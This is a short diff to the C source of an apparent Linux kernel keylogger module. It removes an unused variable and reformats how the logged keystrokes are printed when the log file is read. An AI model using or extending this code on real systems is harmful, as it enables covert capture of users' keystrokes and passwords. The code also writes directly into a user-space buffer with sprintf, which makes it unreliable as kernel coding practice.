@@ -21,7 +21,6 @@ void addToLog(char key);
 
 int tracker(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
-    struct vc_data *vc = param->vc;
     
     int retval = NOTIFY_OK;
     char key = '0';
@@ -264,11 +263,13 @@ static ssize_t keylogger_read(struct file *file, char __user *buffer, size_t cou
 
 	if(*pos != 0) { return 0; }	
 
+    length += sprintf(buffer+length, "[");
 	for(i = LOGGER_LENGTH-1; i >= 0; i--) {
 
-        length += sprintf(buffer+length,"%d. %c\n", (LOGGER_LENGTH-i), log[i]);
+        length += sprintf(buffer+length,"%c ", log[i]);
         
     }
+    length += sprintf(buffer+length, "]\n");
 
 	*pos = length;
 
